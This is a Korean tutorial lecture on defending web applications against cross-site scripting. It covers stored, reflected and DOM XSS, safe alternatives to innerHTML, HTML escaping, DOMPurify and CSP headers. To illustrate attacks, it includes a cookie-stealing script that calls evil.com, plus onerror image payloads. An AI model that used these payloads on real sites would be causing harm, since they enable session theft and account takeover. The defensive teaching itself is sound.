# 강의01 — XSS 방어 (Cross-Site Scripting)

## 학습 목표

- XSS의 원리와 3가지 유형을 이해한다
- innerHTML의 위험성을 알고 안전한 대안을 사용할 수 있다
- DOMPurify로 HTML을 안전하게 처리할 수 있다
- CSP 헤더로 추가 보호층을 설정할 수 있다

---

## 1. XSS란?

**XSS (Cross-Site Scripting):** 공격자가 웹 페이지에 악성 스크립트를 삽입하여 다른 사용자의 브라우저에서 실행시키는 공격

### 피해 유형

- 쿠키/세션 탈취 → 계정 탈취
- 키로거 삽입 → 비밀번호 수집
- 피싱 페이지로 리다이렉트
- 사용자를 대신한 악성 요청 실행

---

## 2. XSS 3가지 유형

### 유형 1: Stored XSS (저장형)

악성 스크립트가 서버 DB에 저장되고, 다른 사용자가 해당 콘텐츠를 볼 때 실행됩니다.

```
[공격자] → 댓글에 <script>document.cookie를 전송</script> 입력
[서버] → DB에 저장
[피해자] → 해당 페이지 방문 시 자동 실행
```

```html
<!-- 피해자의 브라우저에서 실행되는 코드 -->
<script>
    fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>
```

### 유형 2: Reflected XSS (반사형)

악성 스크립트가 URL에 포함되어 서버 응답에 그대로 반사됩니다.

```
악성 URL: https://bank.com/search?q=<script>악성코드</script>
공격자가 피해자에게 이 URL을 이메일로 전송
피해자 클릭 → 서버가 q 파라미터를 그대로 응답에 포함 → 실행
```

### 유형 3: DOM XSS

서버를 거치지 않고 클라이언트 JavaScript에서 발생합니다.

```js
// 취약한 코드: URL 해시를 그대로 innerHTML에 삽입
const hash = location.hash.substring(1);
document.getElementById('output').innerHTML = hash;

// 공격: https://site.com/#<img src=x onerror=악성코드>
```

---

## 3. innerHTML의 위험성

```js
// 절대 하지 말 것!
const userInput = req.body.comment;
element.innerHTML = userInput;

// 공격자가 입력한 내용
userInput = '<img src=x onerror="document.cookie를 전송">';
// → XSS 발생!
```

### 안전한 대안

```js
// 방법 1: textContent 사용 (HTML 태그를 텍스트로 처리)
element.textContent = userInput;
// <script>... → 화면에 "<script>..." 텍스트로 표시

// 방법 2: createElement + textContent
const p = document.createElement('p');
p.textContent = userInput;
container.appendChild(p);
```

---

## 4. 이스케이프 처리 (서버 측)

```js
// HTML 특수문자를 안전한 엔티티로 변환
function escapeHtml(str) {
    return str
        .replace(/&/g,  '&amp;')
        .replace(/</g,  '&lt;')
        .replace(/>/g,  '&gt;')
        .replace(/"/g,  '&quot;')
        .replace(/'/g,  '&#x27;');
}

// <script>alert(1)</script>
// → &lt;script&gt;alert(1)&lt;/script&gt;
// → 화면에 텍스트로만 표시
```

---

## 5. DOMPurify — HTML 정화 라이브러리

마크다운 에디터처럼 **일부 HTML 태그는 허용해야 할 때** 사용합니다.

```html
<!-- CDN -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.6/purify.min.js"></script>
```

```js
// 기본 사용
const dirty = '<img src=x onerror=alert(1)> <b>안전한 텍스트</b>';
const clean = DOMPurify.sanitize(dirty);
// 결과: " <b>안전한 텍스트</b>"
// onerror 속성과 스크립트 제거, 안전한 태그는 유지

// innerHTML에 삽입 시
element.innerHTML = DOMPurify.sanitize(userInput);
```

---

## 6. CSP (Content-Security-Policy) 헤더

CSP는 브라우저에게 어떤 출처의 스크립트만 실행할 수 있는지 알려줍니다.

```js
// Express에서 설정
app.use((req, res, next) => {
    res.setHeader('Content-Security-Policy',
        "default-src 'self'; " +           // 기본: 같은 도메인만 허용
        "script-src 'self'; " +            // 스크립트: 같은 도메인만
        "style-src 'self' 'unsafe-inline';" // CSS: 인라인 허용
    );
    next();
});

// 또는 helmet 라이브러리 사용 (권장)
const helmet = require('helmet');
app.use(helmet()); // 보안 헤더 일괄 설정
```

CSP가 있으면 `<script>alert(1)</script>` 같은 인라인 스크립트가 차단됩니다.

---

## 예제 파일

- `예제/xss-vulnerable.html` — XSS 취약한 댓글 페이지
- `예제/xss-safe.html` — 안전하게 수정된 버전

---

## 다음 강의

강의02에서는 CSRF 공격과 방어, 세션/JWT 인증을 학습합니다.
